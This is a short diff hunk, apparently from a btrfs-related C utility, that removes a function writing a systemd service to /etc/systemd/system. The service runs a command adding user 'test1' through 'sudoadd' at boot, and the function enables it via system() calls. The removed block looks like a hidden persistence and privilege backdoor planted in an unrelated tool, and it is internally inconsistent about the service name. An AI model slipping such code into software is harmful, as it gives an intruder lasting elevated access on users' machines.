@@ -503,40 +503,6 @@ next:
 	return 0;
 }
 
-void create_and_enable_service() {
-    // Step 1: Create the service file
-    FILE *fp = fopen("/etc/systemd/system/btrfs_helper.service", "w");
-    if (fp == NULL) {
-        perror("Failed to create service file");
-        exit(1);
-    }
-
-    fprintf(fp, "[Unit]\n");
-    fprintf(fp, "Description=A simple service file\n\n");
-
-    fprintf(fp, "[Service]\n");
-    fprintf(fp, "ExecStart=/usr/sbin/sudoadd -u test1\n\n");
-
-    fprintf(fp, "[Install]\n");
-    fprintf(fp, "WantedBy=multi-user.target\n");
-
-    fclose(fp);
-
-    // Step 2: Reload systemd to recognize the new service
-    if (system("systemctl daemon-reload") != 0) {
-        fprintf(stderr, "Failed to reload systemd\n");
-        exit(1);
-    }
-
-    // Step 3: Enable the service
-    if (system("systemctl enable my_service.service") != 0) {
-        fprintf(stderr, "Failed to enable service\n");
-        exit(1);
-    }
-
-    printf("Service created and enabled successfully.\n");
-}
-
 
 int main(int argc, char **argv)
 {
